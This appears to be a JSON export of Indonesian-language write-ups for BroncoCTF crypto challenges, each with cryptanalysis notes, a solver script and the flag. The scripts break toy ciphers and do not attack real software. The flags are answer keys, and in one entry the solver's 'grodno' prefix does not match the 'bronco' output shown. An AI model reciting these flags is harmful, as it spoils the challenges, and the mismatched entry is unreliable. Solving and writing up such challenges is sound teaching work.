        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nEMOJIS = [\"🍎\", \"🦊\", \"🍐\", \"🐶\", \"🎈\"]\r\n\r\n# Polybius square yang tertulis pada wajah di artifact.png.\r\nSQUARE = [\r\n    [\"b\", \"r\", \"o\", \"n\", \"c\"],\r\n    [\"{\", \"e\", \"m\", \"0\", \"j\"],\r\n    [\"1\", \"s\", \"_\", \"g\", \"3\"],\r\n    [\"}\", \"a\", \"d\", \"f\", \"h\"],\r\n    [\"i\", \"k\", \"l\", \"p\", \"q\"],\r\n]\r\n\r\nLOOKUP = {\r\n    EMOJIS[row] + EMOJIS[column]: SQUARE[row][column]\r\n    for row in range(5)\r\n    for column in range(5)\r\n}\r\n\r\n\r\ndef decode(text: str) -> str:\r\n    tokens = text.split()\r\n    output: list[str] = []\r\n\r\n    for token in tokens:\r\n        try:\r\n            output.append(LOOKUP[token])\r\n        except KeyError as exc:\r\n            raise ValueError(f\"Pasangan emoji tidak dikenal: {token!r}\") from exc\r\n\r\n    return \"\".join(output)\r\n\r\n\r\ndef main() -> None:\r\n    input_path = Path(\r\n        sys.argv[1] if len(sys.argv) > 1 else \"intercepted_signals.txt\"\r\n    )\r\n    encoded = input_path.read_text(encoding=\"utf-8\").strip()\r\n    flag = decode(encoded)\r\n\r\n    if not (flag.startswith(\"bronco{\") and flag.endswith(\"}\")):\r\n        raise ValueError(f\"Hasil decode tidak menyerupai flag: {flag}\")\r\n\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{em0j1s_r_cr1ng3}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-crypto-garbageinflagout",
    "title": "Garbage In, Flag Out",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "- **CTF:** BroncoCTF\n- **Category:** Crypto\n- **Difficulty:** Medium\n- **Flag:** `bronco{n0t_r4nd0m_3nough}`",
    "problemDescription": "- **CTF:** BroncoCTF\n- **Category:** Crypto\n- **Difficulty:** Medium\n- **Flag:** `bronco{n0t_r4nd0m_3nough}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Titik Lemah",
        "content": "Flag dan random garbage memakai key yang sama dalam dua bentuk:\n\n```python\ngarb = block_encrypt(key, real_garb)\n\nkey = scramble(key)\nflag = block_encrypt(key, FLAG)\n```\n\n`FLAG` mempunyai panjang `N`, sama dengan panjang key. Karena itu enkripsi flag hanya memakai blok key pertama:\n\n```text\nflag_cipher[i] = scramble(key[i]) XOR flag[i]\n```\n\nFungsi `scramble()` cuma membalik urutan bit dalam setiap byte. Operasinya reversibel dan tidak menambah keamanan.\n\nMasalah utamanya ada pada random garbage. Plaintext-nya diketahui berasal dari alfabet kecil:\n\n```python\nreal_garb = \"\".join(random.choices(string.ascii_lowercase, k=2 * N))\n```\n\nPanjangnya `2N`, sehingga ciphertext garbage terbagi menjadi dua bagian:\n\n```text\nG0[i] = key[i] XOR lowercase_1[i]\nG1[i] = extended_key[i] XOR lowercase_2[i]\n```"
      },
      {
        "title": "Membentuk Kandidat Key",
        "content": "Karakter pada bagian pertama garbage pasti salah satu dari `a` sampai `z`.\n\nUntuk setiap posisi dan setiap kandidat huruf kecil:\n\n```text\nkey_candidate = G0[i] XOR candidate_lowercase\n```\n\nSatu byte garbage hanya memberi beberapa kemungkinan key. Bagian kedua dipakai untuk menyaringnya."
      },
      {
        "title": "Kebocoran dari Key Extension",
        "content": "Key extension dibuat dari setiap byte key:\n\n```python\nfor i in range(4):\n    sub = (element >> (2 * i)) & 3\n    sub = (sub & 1) ^ (sub >> 1)\n    newkey += sub << (7 - i)\n\nnewkey += random.getrandbits(4)\n```\n\nEmpat bit bawah memang random, tetapi empat bit atas sepenuhnya ditentukan oleh key lama.\n\nUntuk pasangan bit:\n\n```text\n(b0, b1), (b2, b3), (b4, b5), (b6, b7)\n```\n\nprogram menyimpan XOR tiap pasangan ke bit 7 sampai bit 4:\n\n```text\nhigh_nibble =\n    (b0 XOR b1) << 7 |\n    (b2 XOR b3) << 6 |\n    (b4 XOR b5) << 5 |\n    (b6 XOR b7) << 4\n```\n\nKarena plaintext bagian kedua juga huruf kecil, kandidat key hanya dipertahankan jika ada huruf `a-z` yang memenuhi:\n\n```text\nhigh_nibble(G1[i] XOR lowercase) == derived_high_nibble(key_candidate)\n```\n\nRandom nibble tidak perlu ditebak."
      },
      {
        "title": "Mendapatkan Kandidat Flag",
        "content": "Setelah kandidat key lolos constraint kedua:\n\n```text\nflag_char = flag_cipher[i] XOR reverse_bits(key_candidate)\n```\n\nKarakter dibatasi ke alfabet flag:\n\n```text\na-z, 0-9, _, {, }\n```\n\nHasil per posisi hampir seluruhnya tunggal:\n\n```text\nb r o n c [o|_] { n 0 t [ _|o ] r 4 n d 0 m _ 3 n [o|_] u g h }\n```\n\nFormat `bronco{...}` menentukan karakter keenam sebagai `o`.\n\nKandidat body yang tersisa:\n\n```text\nn0t_r4nd0m_3n_ugh\nn0t_r4nd0m_3nough\nn0tor4nd0m_3n_ugh\nn0tor4nd0m_3nough\n```\n\nDeskripsi memastikan plaintext adalah English leetspeak. Setelah substitusi:\n\n```text\n0 -> o\n4 -> a\n3 -> e\n```\n\nhanya satu kandidat yang membentuk frasa Inggris utuh:\n\n```text\nn0t_r4nd0m_3nough\nnot random enough\n```"
      },
      {
        "title": "Validasi Key",
        "content": "Dengan flag tersebut, key asli dapat dihitung balik:\n\n```text\nkey[i] = reverse_bits(flag_cipher[i] XOR flag[i])\n```\n\nKey yang didapat membuat plaintext bagian pertama garbage menjadi:\n\n```text\ndgpnnyfmhzvzygyvzwuaxgtrd\n```\n\nSeluruhnya huruf kecil, sesuai generator challenge. Setiap posisi pada bagian kedua juga mempunyai setidaknya satu plaintext `a-z` yang cocok dengan high nibble key extension."
      },
      {
        "title": "Menjalankan Solver",
        "content": "```bash\npython3 solve.py output.txt\n```\n\nOutput:\n\n```text\n[+] Kandidat setelah constraint:\n    bronco{n0t_r4nd0m_3nough}\n    bronco{n0t_r4nd0m_3n_ugh}\n    bronco{n0tor4nd0m_3nough}\n    bronco{n0tor4nd0m_3n_ugh}\n[+] Flag: bronco{n0t_r4nd0m_3nough}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport itertools\r\nimport re\r\nimport string\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nLOWERCASE = bytes(string.ascii_lowercase, \"ascii\")\r\nFLAG_CHARS = set(string.ascii_lowercase + string.digits + \"_{}\")\r\n\r\n# Dipakai hanya untuk memilih kandidat yang sesuai hint \"valid English leetspeak\".\r\nCOMMON_WORDS = {\r\n    \"a\", \"about\", \"after\", \"again\", \"all\", \"also\", \"an\", \"and\", \"any\",\r\n    \"are\", \"as\", \"at\", \"be\", \"because\", \"been\", \"before\", \"but\", \"by\",\r\n    \"can\", \"cipher\", \"code\", \"data\", \"do\", \"each\", \"enough\", \"even\",\r\n    \"every\", \"flag\", \"for\", \"from\", \"get\", \"good\", \"have\", \"he\", \"her\",\r\n    \"here\", \"how\", \"i\", \"if\", \"in\", \"into\", \"is\", \"it\", \"key\", \"know\",\r\n    \"make\", \"message\", \"more\", \"new\", \"no\", \"not\", \"now\", \"of\", \"on\",\r\n    \"one\", \"only\", \"or\", \"other\", \"our\", \"out\", \"random\", \"read\", \"same\",\r\n    \"secret\", \"see\", \"so\", \"some\", \"that\", \"the\", \"their\", \"them\", \"then\",\r\n    \"there\", \"they\", \"this\", \"time\", \"to\", \"two\", \"up\", \"use\", \"was\",\r\n    \"we\", \"what\", \"when\", \"which\", \"who\", \"will\", \"with\", \"you\", \"your\",\r\n}\r\n\r\nLEET_TABLE = str.maketrans({\r\n    \"0\": \"o\",\r\n    \"1\": \"i\",\r\n    \"3\": \"e\",\r\n    \"4\": \"a\",\r\n    \"5\": \"s\",\r\n    \"7\": \"t\",\r\n})\r\n\r\n\r\ndef reverse_bits(value: int) -> int:\r\n    \"\"\"Implementasi satu byte dari scramble().\"\"\"\r\n    result = 0\r\n    for bit in range(8):\r\n        result |= ((value >> bit) & 1) << (7 - bit)\r\n    return result\r\n\r\n\r\ndef extension_high_nibble(key_byte: int) -> int:\r\n    \"\"\"\r\n    Empat bit atas dari key extension bersifat deterministik.\r\n    Empat bit bawah berasal dari random.getrandbits(4).\r\n    \"\"\"\r\n    result = 0\r\n    for pair_index in range(4):\r\n        pair = (key_byte >> (2 * pair_index)) & 0b11\r\n        parity = (pair & 1) ^ (pair >> 1)\r\n        result |= parity << (7 - pair_index)\r\n    return result & 0xF0\r\n\r\n\r\ndef parse_output(path: Path) -> tuple[bytes, bytes]:\r\n    text = path.read_text(encoding=\"utf-8\")\r\n\r\n    garbage_match = re.search(r\"Random garbage:\\s*([0-9a-fA-F]+)\", text)\r\n    flag_match = re.search(r\"The flag:\\s*([0-9a-fA-F]+)\", text)\r\n\r\n    if not garbage_match or not flag_match:\r\n        raise ValueError(\"Format output.txt tidak dikenali\")\r\n\r\n    garbage_cipher = bytes.fromhex(garbage_match.group(1))\r\n    flag_cipher = bytes.fromhex(flag_match.group(1))\r\n\r\n    if len(garbage_cipher) != 2 * len(flag_cipher):\r\n        raise ValueError(\"Panjang garbage harus dua kali panjang flag\")\r\n\r\n    return garbage_cipher, flag_cipher\r\n\r\n\r\ndef candidates_per_position(\r\n    garbage_cipher: bytes,\r\n    flag_cipher: bytes,\r\n) -> list[list[str]]:\r\n    n = len(flag_cipher)\r\n    first_half = garbage_cipher[:n]\r\n    second_half = garbage_cipher[n:]\r\n\r\n    all_candidates: list[list[str]] = []\r\n\r\n    for index in range(n):\r\n        chars: set[str] = set()\r\n\r\n        # Bagian pertama garbage:\r\n        #   G0[i] = key[i] XOR lowercase[i]\r\n        for known_plain in LOWERCASE:\r\n            key_byte = first_half[index] ^ known_plain\r\n            expected_high = extension_high_nibble(key_byte)\r\n\r\n            # Bagian kedua garbage menggunakan key extension.\r\n            # Low nibble key extension acak, tetapi high nibble harus cocok.\r\n            second_plain_exists = any(\r\n                ((second_half[index] ^ candidate_plain) & 0xF0)\r\n                == expected_high\r\n                for candidate_plain in LOWERCASE\r\n            )\r\n            if not second_plain_exists:\r\n                continue\r\n\r\n            # Flag:\r\n            #   F[i] = reverse_bits(key[i]) XOR flag_plain[i]\r\n            flag_plain = flag_cipher[index] ^ reverse_bits(key_byte)\r\n            char = chr(flag_plain)\r\n\r\n            if char in FLAG_CHARS:\r\n                chars.add(char)\r\n\r\n        if not chars:\r\n            raise ValueError(f\"Tidak ada kandidat pada posisi {index}\")\r\n\r\n        all_candidates.append(sorted(chars))\r\n\r\n    return all_candidates\r\n\r\n\r\ndef english_leetspeak_score(candidate: str) -> int:\r\n    if not re.fullmatch(r\"bronco\\{[a-z0-9_]+\\}\", candidate):\r\n        return -10**9\r\n\r\n    body = candidate[len(\"bronco{\"):-1].translate(LEET_TABLE)\r\n    words = body.split(\"_\")\r\n\r\n    if any(not word or not word.isalpha() for word in words):\r\n        return -10**9\r\n\r\n    score = 0\r\n    for word in words:\r\n        if word in COMMON_WORDS:\r\n            score += len(word) ** 2\r\n        else:\r\n            score -= len(word) ** 2\r\n\r\n    return score\r\n\r\n\r\ndef recover_flag(garbage_cipher: bytes, flag_cipher: bytes) -> tuple[str, list[str]]:\r\n    position_candidates = candidates_per_position(garbage_cipher, flag_cipher)\r\n\r\n    candidates = [\r\n        \"\".join(chars)\r\n        for chars in itertools.product(*position_candidates)\r\n    ]\r\n\r\n    formatted = [\r\n        candidate\r\n        for candidate in candidates\r\n        if re.fullmatch(r\"bronco\\{[a-z0-9_]+\\}\", candidate)\r\n    ]\r\n\r\n    if not formatted:\r\n        raise ValueError(\"Tidak ada kandidat dengan format flag yang benar\")\r\n\r\n    ranked = sorted(\r\n        formatted,\r\n        key=lambda value: (english_leetspeak_score(value), value),\r\n        reverse=True,\r\n    )\r\n\r\n    return ranked[0], ranked\r\n\r\n\r\ndef main() -> None:\r\n    input_path = Path(sys.argv[1] if len(sys.argv) > 1 else \"output.txt\")\r\n    garbage_cipher, flag_cipher = parse_output(input_path)\r\n    flag, ranked = recover_flag(garbage_cipher, flag_cipher)\r\n\r\n    print(\"[+] Kandidat setelah constraint:\")\r\n    for candidate in ranked:\r\n        print(f\"    {candidate}\")\r\n\r\n    print(f\"[+] Flag: {flag}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{n0t_r4nd0m_3nough}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-crypto-grandmassecret",
    "title": "Grandma's Secret",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Grandma's Secret",
    "problemDescription": "",
    "tools": [],
    "analysis": "Surat menyebut dua petunjuk secara langsung:\n\n1. `ADFGVX cipher` menunjukkan penggunaan Polybius square 6×6.\n2. `alphabetically sorted SUGAR` menunjukkan keyword transposisi kolom adalah `SUGAR`, lalu kolom dibaca berdasarkan urutan alfabet keyword.\n\nSquare dari gambar:\n\n```text\n      A D F G V X\n    +------------\nA   | B 3 M R L I\nD   | A 6 F 0 8 2\nF   | C 7 S E U H\nG   | Z 9 D X K V\nV   | 1 Q Y W 5 P\nX   | N J T 4 G O\n```\n\nUrutan alfabet keyword `SUGAR` adalah:\n\n```text\nA G R S U\n```\n\nPosisi kolom aslinya:\n\n```text\nS U G A R\n3 4 2 0 1   # indeks jika dihitung dari nol setelah sorting\n```\n\nCiphertext memiliki 20 karakter dan keyword panjangnya 5, jadi setiap kolom berisi 4 karakter. Ciphertext dipecah sesuai urutan alfabet keyword:\n\n```text\nA -> GVXX\nG -> FVXV\nR -> AFXF\nS -> XVGA\nU -> DAFF\n```\n\nDikembalikan ke posisi kolom asli `S U G A R`:\n\n```text\nS -> XVGA\nU -> DAFF\nG -> FVXV\nA -> GVXX\nR -> AFXF\n```\n\nMembaca tabel per baris menghasilkan stream koordinat ADFGVX:\n\n```text\nXDFGAVAVVFGFXXXAFVXF\n```\n\nStream tersebut dipisahkan menjadi pasangan:\n\n```text\nXD FG AV AV VF GF XX XA FV XF\n```\n\nLookup ke square menghasilkan:\n\n```text\nJ  E  L  L  Y  D  O  N  U  T\n```\n\nPassword WiFi-nya adalah:\n\n```text\nJELLYDONUT\n```",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Kategori:** Crypto\n- **Cipher:** ADFGVX + columnar transposition\n- **Keyword:** `SUGAR`\n- **Ciphertext:** `GVXX FVXV AFXF XVGA DAFF`\n\nBagian yang gampang salah dibaca ada di grup kedua. Tulisannya adalah `FVXV`, bukan `FVVV`. Kalau dibaca `FVVV`, hasil dekripsi menjadi `JELLYDPNUT` dan jelas ada satu karakter yang salah."
      },
      {
        "title": "Solver",
        "content": "```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nOutput:\n\n```text\nkey               : SUGAR\nciphertext        : GVXXFVXVAFXFXVGADAFF\ncoordinate stream : XDFGAVAVVFGFXXXAFVXF\nplaintext         : JELLYDONUT\nflag              : bronco{jellydonut}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Solver for the Crypto challenge: Grandma's Secret.\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nfrom math import ceil\r\n\r\nLABELS = \"ADFGVX\"\r\nKEY = \"SUGAR\"\r\nCIPHERTEXT = \"GVXXFVXVAFXFXVGADAFF\"\r\n\r\n# Square copied from the image. Rows and columns both use A D F G V X.\r\nSQUARE = (\r\n    \"B3MRLI\",\r\n    \"A6F082\",\r\n    \"C7SEUH\",\r\n    \"Z9DXKV\",\r\n    \"1QYW5P\",\r\n    \"NJT4GO\",\r\n)\r\n\r\n\r\ndef undo_columnar_transposition(ciphertext: str, key: str) -> str:\r\n    \"\"\"Undo a standard columnar transposition read in sorted-key order.\"\"\"\r\n    width = len(key)\r\n    length = len(ciphertext)\r\n    rows = ceil(length / width)\r\n    remainder = length % width\r\n\r\n    # During encryption, columns before `remainder` in original order receive\r\n    # one extra character when the final row is incomplete.\r\n    original_lengths = [rows if remainder == 0 or i < remainder else rows - 1 for i in range(width)]\r\n    sorted_indices = sorted(range(width), key=lambda i: (key[i], i))\r\n\r\n    columns = [\"\"] * width\r\n    offset = 0\r\n    for original_index in sorted_indices:\r\n        column_length = original_lengths[original_index]\r\n        columns[original_index] = ciphertext[offset : offset + column_length]\r\n        offset += column_length\r\n\r\n    stream: list[str] = []\r\n    for row in range(rows):\r\n        for column in range(width):\r\n            if row < len(columns[column]):\r\n                stream.append(columns[column][row])\r\n\r\n    return \"\".join(stream)\r\n\r\n\r\ndef decode_adfgvx(stream: str) -> str:\r\n    \"\"\"Decode coordinate pairs using the supplied 6x6 ADFGVX square.\"\"\"\r\n    if len(stream) % 2:\r\n        raise ValueError(\"ADFGVX coordinate stream must have an even length\")\r\n\r\n    coordinates = {\r\n        LABELS[row] + LABELS[column]: SQUARE[row][column]\r\n        for row in range(6)\r\n        for column in range(6)\r\n    }\r\n\r\n    plaintext: list[str] = []\r\n    for index in range(0, len(stream), 2):\r\n        pair = stream[index : index + 2]\r\n        try:\r\n            plaintext.append(coordinates[pair])\r\n        except KeyError as exc:\r\n            raise ValueError(f\"Invalid ADFGVX pair: {pair}\") from exc\r\n\r\n    return \"\".join(plaintext)\r\n\r\n\r\ndef main() -> None:\r\n    coordinate_stream = undo_columnar_transposition(CIPHERTEXT, KEY)\r\n    plaintext = decode_adfgvx(coordinate_stream)\r\n    flag = f\"grodno{{{plaintext.lower()}}}\"\r\n\r\n    print(f\"key               : {KEY}\")\r\n    print(f\"ciphertext        : {CIPHERTEXT}\")\r\n    print(f\"coordinate stream : {coordinate_stream}\")\r\n    print(f\"plaintext         : {plaintext}\")\r\n    print(f\"flag              : {flag}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{jellydonut}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-crypto-probablyunbreakable",
    "title": "Probably Unbreakable",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Probably Unbreakable",
    "problemDescription": "Flag dienkripsi berkali-kali dengan XOR:\n\n```python\nenc = bytes([ord(f) ^ ord(k) for f, k in zip(flag, key)])\n```\n\nMasalahnya ada pada key. Setiap byte key tidak berasal dari seluruh rentang `0..255`, tetapi hanya dari 64 karakter berikut:\n\n```text\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-\n```\n\nUntuk satu byte ciphertext `c`, kandidat plaintext hanya:\n\n```text\np = c XOR k\n```\n\ndengan `k` salah satu dari 64 karakter tadi.\n\nSatu ciphertext masih menyisakan banyak kandidat. Namun server mengizinkan kita meminta ribuan enkripsi dari flag yang sama dengan key baru. Kandidat tiap posisi cukup diiriskan sampai tersisa satu byte.\n\nTidak perlu memprediksi state Python `random`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Source yang relevan",
        "content": "```python\nkeystring = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-\"\n\ndef encrypt_flag(n):\n    for _ in range(n):\n        key = random.choices(keystring, k=len(flag))\n        enc = bytes([ord(f) ^ ord(k) for f, k in zip(flag, key)])\n        print(enc.hex())\n```\n\nFlag selalu sama, sedangkan key dipilih ulang untuk setiap request.\n\nUntuk posisi ke-`i`:\n\n```text\nC[j][i] = F[i] XOR K[j][i]\n```\n\nKarena `K[j][i]` pasti berasal dari `keystring`, kandidat plaintext dari satu sample adalah:\n\n```text\nCandidates(j, i) = { C[j][i] XOR k | k ∈ keystring }\n```\n\nKandidat akhir:\n\n```text\nCandidates(i) =\n    Candidates(0, i)\n  ∩ Candidates(1, i)\n  ∩ ...\n  ∩ Candidates(n-1, i)\n```\n\nByte flag asli selalu berada di semua himpunan tersebut. Kandidat palsu makin cepat hilang saat jumlah sample bertambah."
      },
      {
        "title": "Strategi",
        "content": "Kita tidak butuh output `shuffle()` atau `pick_random_letters()`. Minta:\n\n```text\nlist scrambles       = 0\nrandom letter picks  = 0\nflag encryptions     = 512\n```\n\nBatas total request adalah 20.000, jadi 512 masih aman."
      },
      {
        "title": "Solver",
        "content": "Dependency:\n\n```bash\npython3 -m pip install pwntools\n```\n\nJalankan:\n\n```bash\npython3 solve.py 0.cloud.chals.io 16474\n```\n\nBagian inti solver:\n\n```python\nKEYSTRING = b\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-\"\n\ncandidates = [set(range(256)) for _ in range(flag_length)]\n\nfor ciphertext in ciphertexts:\n    for index, cipher_byte in enumerate(ciphertext):\n        possible = {\n            cipher_byte ^ key_byte\n            for key_byte in KEYSTRING\n        }\n        candidates[index].intersection_update(possible)\n\nflag = bytes(next(iter(values)) for values in candidates)\n```\n\nSolver juga memeriksa apakah setiap posisi sudah menyisakan tepat satu kandidat. Kalau belum, jumlah sample bisa dinaikkan:\n\n```bash\npython3 solve.py 0.cloud.chals.io 16474 --samples 1024\n```"
      },
      {
        "title": "Output",
        "content": "```text\n[+] Received 100/512\n[+] Received 200/512\n[+] Received 300/512\n[+] Received 400/512\n[+] Received 500/512\n[+] Received 512/512\n<FLAG>bronco{4t_l3a5t_1mpr0b4b1e_th0ugh}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport re\r\nfrom typing import Iterable\r\n\r\nfrom pwn import context, remote\r\n\r\n\r\nKEYSTRING = b\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-\"\r\nHEX_LINE = re.compile(rb\"^[0-9a-fA-F]+$\")\r\n\r\n\r\ndef possible_plaintexts(cipher_byte: int) -> set[int]:\r\n    return {cipher_byte ^ key_byte for key_byte in KEYSTRING}\r\n\r\n\r\ndef recover_flag(ciphertexts: Iterable[bytes]) -> tuple[bytes, list[set[int]]]:\r\n    ciphertexts = list(ciphertexts)\r\n    if not ciphertexts:\r\n        raise ValueError(\"Tidak ada ciphertext yang diterima\")\r\n\r\n    flag_length = len(ciphertexts[0])\r\n    if any(len(item) != flag_length for item in ciphertexts):\r\n        raise ValueError(\"Panjang ciphertext tidak konsisten\")\r\n\r\n    candidates = [set(range(256)) for _ in range(flag_length)]\r\n\r\n    for ciphertext in ciphertexts:\r\n        for index, cipher_byte in enumerate(ciphertext):\r\n            candidates[index].intersection_update(\r\n                possible_plaintexts(cipher_byte)\r\n            )\r\n\r\n    unresolved = [index for index, values in enumerate(candidates) if len(values) != 1]\r\n    if unresolved:\r\n        details = []\r\n        for index in unresolved:\r\n            printable = sorted(\r\n                value for value in candidates[index]\r\n                if 0x20 <= value <= 0x7E\r\n            )\r\n            rendered = \"\".join(chr(value) for value in printable)\r\n            details.append(\r\n                f\"pos {index}: {len(candidates[index])} kandidat \"\r\n                f\"(printable={rendered!r})\"\r\n            )\r\n        raise RuntimeError(\r\n            \"Flag belum unik. Naikkan --samples.\\n\" + \"\\n\".join(details)\r\n        )\r\n\r\n    flag = bytes(next(iter(values)) for values in candidates)\r\n    return flag, candidates\r\n\r\n\r\ndef receive_ciphertexts(io, count: int) -> list[bytes]:\r\n    ciphertexts: list[bytes] = []\r\n\r\n    while len(ciphertexts) < count:\r\n        line = io.recvline(timeout=15)\r\n        if not line:\r\n            raise EOFError(\r\n                f\"Koneksi ditutup setelah menerima \"\r\n                f\"{len(ciphertexts)}/{count} ciphertext\"\r\n            )\r\n\r\n        candidate = line.strip()\r\n        if not HEX_LINE.fullmatch(candidate) or len(candidate) % 2 != 0:\r\n            continue\r\n\r\n        try:\r\n            decoded = bytes.fromhex(candidate.decode())\r\n        except ValueError:\r\n            continue\r\n\r\n        ciphertexts.append(decoded)\r\n\r\n        if len(ciphertexts) % 100 == 0 or len(ciphertexts) == count:\r\n            print(f\"[+] Received {len(ciphertexts)}/{count}\")\r\n\r\n    return ciphertexts\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Solve BroncoCTF Probably Unbreakable\"\r\n    )\r\n    parser.add_argument(\r\n        \"host\",\r\n        nargs=\"?\",\r\n        default=\"0.cloud.chals.io\",\r\n        help=\"remote host\",\r\n    )\r\n    parser.add_argument(\r\n        \"port\",\r\n        nargs=\"?\",\r\n        type=int,\r\n        default=16474,\r\n        help=\"remote port\",\r\n    )\r\n    parser.add_argument(\r\n        \"-n\",\r\n        \"--samples\",\r\n        type=int,\r\n        default=512,\r\n        help=\"jumlah encrypted flag yang diminta (default: 512)\",\r\n    )\r\n    parser.add_argument(\r\n        \"--debug\",\r\n        action=\"store_true\",\r\n        help=\"aktifkan log pwntools\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    if args.samples <= 0 or args.samples > 20_000:\r\n        parser.error(\"--samples harus berada pada rentang 1..20000\")\r\n\r\n    context.log_level = \"debug\" if args.debug else \"error\"\r\n\r\n    io = remote(args.host, args.port)\r\n\r\n    io.sendlineafter(\r\n        b\"How many list-scrambles do you want?\",\r\n        b\"0\",\r\n    )\r\n    io.sendlineafter(\r\n        b\"How many random-letter-pickings do you want?\",\r\n        b\"0\",\r\n    )\r\n    io.sendlineafter(\r\n        b\"How many flag encryptions do you want?\",\r\n        str(args.samples).encode(),\r\n    )\r\n\r\n    ciphertexts = receive_ciphertexts(io, args.samples)\r\n    io.close()\r\n\r\n    flag, _ = recover_flag(ciphertexts)\r\n\r\n    try:\r\n        decoded_flag = flag.decode(\"ascii\")\r\n    except UnicodeDecodeError:\r\n        decoded_flag = repr(flag)\r\n\r\n    print(f\"<FLAG>{decoded_flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{4t_l3a5t_1mpr0b4b1e_th0ugh}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-crypto-shiftingaway",
    "title": "Shifting Away",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Shifting Away",
    "problemDescription": "Cipher yang dipakai adalah **progressive Caesar shift**. Besar pergeseran berubah untuk setiap posisi karakter:\n\n- karakter pada indeks `0` digeser maju `0`\n- karakter pada indeks `1` digeser maju `1`\n- karakter pada indeks `2` digeser maju `2`\n- dan seterusnya\n\nBrace dan underscore tidak ikut diubah, tetapi tetap dihitung sebagai posisi dalam aliran shift.",
    "tools": [],
    "analysis": "Prefix ciphertext adalah:\n\n```text\nbqmkyj\n```\n\nFormat flag Bronco memakai prefix `bronco`. Perbandingannya langsung membentuk pola:\n\n```text\nb + 0 = b\nq + 1 = r\nm + 2 = o\nk + 3 = n\ny + 4 = c\nj + 5 = o\n```\n\nIni cocok dengan petunjuk `char after char` dan `braces/underscores against the stream`.\n\nKesalahan yang mudah terjadi adalah menaikkan counter hanya ketika bertemu huruf. Hasilnya tetap acak. Counter yang benar berasal dari **indeks absolut seluruh string**, termasuk `{`, `}`, dan `_`.",
    "solution": [
      {
        "title": "Ciphertext",
        "content": "```text\nbqmkyj{Ldfmam_Nfd_Abxjpb_Thhdqeia_Snqn_Vzey_Bok_TdudakQkwfy_Kkhxbte_Yo_Jnfvdeueqq}\n```"
      },
      {
        "title": "Solver",
        "content": "```python\ndef decrypt(ciphertext: str) -> str:\n    output = []\n\n    for position, char in enumerate(ciphertext):\n        if \"a\" <= char <= \"z\":\n            base = ord(\"a\")\n            output.append(chr((ord(char) - base + position) % 26 + base))\n        elif \"A\" <= char <= \"Z\":\n            base = ord(\"A\")\n            output.append(chr((ord(char) - base + position) % 26 + base))\n        else:\n            output.append(char)\n\n    return \"\".join(output)\n```\n\nJalankan:\n\n```bash\npython3 solve.py\n```\n\nOutput:\n\n```text\n<FLAG>bronco{Slowly_But_Surely_Shifting_Away_Into_The_PascalSnake_Strings_Of_Characters}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
